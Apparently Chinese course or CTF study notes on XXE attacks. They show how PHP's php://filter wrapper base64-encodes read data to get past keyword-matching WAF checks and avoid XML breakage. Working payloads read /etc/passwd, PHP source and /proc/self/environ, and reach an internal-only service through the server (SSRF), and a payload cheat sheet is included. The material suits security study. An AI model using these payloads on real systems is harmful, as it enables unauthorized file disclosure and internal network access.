---
title: XXE 读取文件：php 伪协议的妙用
category: XXE/利用
tags: [XXE, php伪协议, php://filter, base64, WAF绕过, 读取源码]
source: 课程笔记 2025-10-19
date: 2025-10-19
order: 4
---

## 一句话概括

XXE 里 **`php://` 伪协议不能用来执行命令**，但 **`php://filter` 可以在「读文件」这一步上加一层编码**（最常用 base64）。于是拿到的不是明文而是密文，既能躲开 WAF 对敏感关键词的匹配，也能避免二进制内容「乱码 / 截断」。

## 本题情景与解题手法

### 题目形态

靶机上有一个**只在内网监听的 HTTP 服务**，我们要用 XXE 去请求它、把结果读出来。源码里那行关键代码是：

```php
<input name="cmd" ...>
```

也就是这个内部服务的参数名是 `cmd`。

### 第一步：确认服务端能不能读 URL

先用 `file://` 读一个已知存在的本地文件，确认 XXE 通了：

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

响应里出现 `/etc/passwd` 的内容 → 外部实体可以加载。

### 第二步：把目标换成内部 HTTP 服务

```xml
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://x.x.x.x/?cmd=cat">
]>
<data>&xxe;</data>
```

### 第三步：为什么参数名要从源码里找

`resource=` 后面这段 `http://x.x.x.x/?cmd=cat` 里的 **`cmd` 就是目标服务接收的参数名**，它不是猜出来的 —— **要从目标源码里 `input` 标签的 `name=""` 属性去读**。

如果参数名写错，目标服务不会执行任何动作，返回的是一张什么都没做的页面，编码后你只会看到一堆「无意义」的 base64，容易误以为 payload 没生效。

### 第四步：解码看结果

拿到的响应是一串 base64：

```bash
echo "PGh0bWw+...省略..." | base64 -d
```

### 解题手法一句话总结

> **`php://filter/read=convert.base64-encode/resource=<目标>`** —— `resource` 后面既可以是**本地文件路径**，也可以是**一个 URL**。指向内部服务时，就相当于借服务器的身份去访问一个「只有它才访问得到」的地址，参数名从目标源码的 `input name=""` 里抄。

## 原理

### 1. `php://` 在 XXE 里能做什么、不能做什么

| 能力 | 是否可行 | 原因 |
|---|---|---|
| **读取文件** | 可以（`php://filter`） | filter 是**读/写流**时套的编解码层，本质还是「读」 |
| **执行命令** | **不可以** | XXE 只是让解析器「读一个资源」，没有任何地方把读到的内容当代码执行 |
| 读 `php://input` | 一般不行 | 请求体本身就是这份 XML，会形成自引用/被解析器限制 |

> 原笔记结论原文：**「XXE 中不可以用 php 伪协议执行命令，相较于 file 伪协议，php 伪协议可以对读取出的文件进行数据编码。」** 这两句是本篇最重要的结论 —— php 伪协议在 XXE 里的价值不在「执行」，而在「编码」。

### 2. `php://filter` 的语法结构

```text
php://filter/read=<读取时的过滤器>/resource=<目标>
```

| 参数 | 作用 | 示例 |
|---|---|---|
| `read` | 读取时应用的过滤器 | `read=convert.base64-encode` |
| `write` | 写入时应用的过滤器 | `write=string.rot13` |
| `resource` | 目标文件路径（或 URL） | `resource=/etc/passwd` |

**数据流**：解析器去读 `resource` 指定的目标 → 读出来的字节流先经过 `read=` 指定的过滤器 → 过滤器的输出才是「实体最终的值」→ 被填进 XML 节点。

```text
resource 文件 ──读──▶ convert.base64-encode ──▶ 实体值（base64 串）──▶ 页面回显
```

所以**编码发生在「数据回到文档之前」**，页面看到的就是密文。

### 3. 为什么要编码：两个真实问题

#### 问题一：读取明文会被 WAF 拦

假设服务端有这类检查（原笔记示例）：

```php
<?php
// 假设有防护代码检查文件内容
$content = file_get_contents($_GET['file']);

if (strpos($content, 'password') !== false ||
    strpos($content, 'root:') !== false) {
    die('敏感文件禁止访问！');
}

echo $content;
?>
```

```php
// 直接读取被阻止
?file=/etc/passwd
// 结果：检测到 root:，被拦截

// 使用 base64 编码绕过
?file=php://filter/read=convert.base64-encode/resource=/etc/passwd
// 结果：返回 base64 编码内容，WAF 检测不到明文敏感信息
// 攻击者再自行解码：echo "base64内容" | base64 -d
```

关键点：**`root:` / `password` 这些关键词以明文形式出现才会被匹配**。base64 之后字节序列完全不同，字符串匹配（`strpos`、正则）自然失效。

#### 问题二：二进制/特殊字符内容会乱码或被截断

```php
<?php
// 读取二进制文件可能显示乱码或截断
$content = file_get_contents('/proc/self/environ');
echo $content; // 可能显示不完整或乱码
?>
```

```php
// 使用 base64 确保完整传输
?file=php://filter/read=convert.base64-encode/resource=/proc/self/environ
// 返回干净的 base64 字符串，无特殊字符问题
```

原因：`/proc/self/environ`、可执行文件、图片这类内容里有 `\x00` 空字节和各种不可打印字符。它们在放进 XML 文本节点时可能破坏文档结构（空字节会被截断），base64 是纯 ASCII 字母表，**不会被 XML 语法当成特殊字符**，因此能安全、完整地运出来。

> 同理，**读 PHP 源码**时也强烈建议用 base64 —— 源码里必然带 `<`、`>`，明文放进 XML 节点会直接把文档结构搞坏。

### 4. 常用过滤器

| 过滤器 | 功能 | 用途 |
|---|---|---|
| `convert.base64-encode` | Base64 编码 | **绕过 WAF 检测、读取源码**（最常用） |
| `convert.base64-decode` | Base64 解码 | 数据处理（配合写入） |
| `string.rot13` | ROT13 编码 | 简单的编码转换 |
| `zlib.deflate` | 压缩数据 | 减少数据体积 |
| `string.toupper` | 转为大写 | 数据格式化 |

## 利用条件

1. **后端是 PHP** —— `php://filter` 是 PHP 的流包装器，非 PHP 环境不认识这个协议
2. **解析器放行 `php://` 协议** —— libxml 默认支持的协议列表里包含 PHP 注册的流
3. **目标可读** —— `resource=` 必须是服务器进程有读权限的文件 / 可访问的 URL
4. **有回显或可外带** —— 编码只是把数据变了个样，还是得运出来

## Payload 速查

| 目的 | Payload |
|---|---|
| 读文件并 base64 编码（有回显） | `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">` |
| 读 PHP 源码（避免破坏 XML 结构） | `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">` |
| 读进程环境变量 | `...resource=/proc/self/environ` |
| 不编码直接读（易被拦/乱码） | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| 借服务器访问内网服务 | `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://x.x.x.x/?cmd=cat">` |
| 多层过滤器 | `php://filter/read=string.toupper/convert.base64-encode/resource=/etc/passwd` |

## 完整示例

### 基础用法

```xml
<!DOCTYPE root [
<!ENTITY ben SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
```

### 完整可用的请求体

```xml
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
```

响应里 `<data>` 的位置会变成：

```text
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW46L2Jpbi9iYXNoCmRhZW1vbjp4OjE6MTpkYWVtb246L3Vzci9zYmluOi91c3Ivc2Jpbi9ub2xvZ2luCg==
```

本机解码：

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW46L2Jpbi9iYXNoCg==" | base64 -d
```

```text
root:x:0:0:root:/root:/bin/bash
```

### 实操：借服务器访问内网服务

```xml
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://x.x.x.x/?cmd=cat">
]>
<data>&xxe;</data>
```

> `cmd` 是参数名，从源代码中寻找 `input` 行中 `name=""` 的内容。

## 踩坑与备注

- **原笔记重要结论**：XXE 中**不可以用 php 伪协议执行命令**。想要命令执行，方向是 `expect://`（见《XXE-expect扩展命令执行》）或其他 RCE 落地手法，而不是 `php://`。
- **不要对 `php://input` 抱幻想**：请求体本身就是这份 XML，再用 `php://input` 去读自己会导致循环/解析异常。
- **`Shell 权限`的含义**（原笔记 tips）：指的是用户通过**命令行界面**与操作系统内核交互的权限和能力。XXE 拿到的也只是 Web 进程（如 `www-data`）这点权限，不是 root。
- **`resource=` 后面放 URL 时并不等于 RCE**：它只是「让服务器去访问这个地址」，命令是否执行取决于**那个内部服务自己**接不接 `cmd` 这种参数。
- **base64 内容里有 `+` `/` `=`**：手工复制到终端时注意加引号，避免被 shell 解释。
- **本文把原笔记里的内网地址 `10.1.2.3` 统一抽象为 `x.x.x.x`**，实战时替换成目标可达的地址。
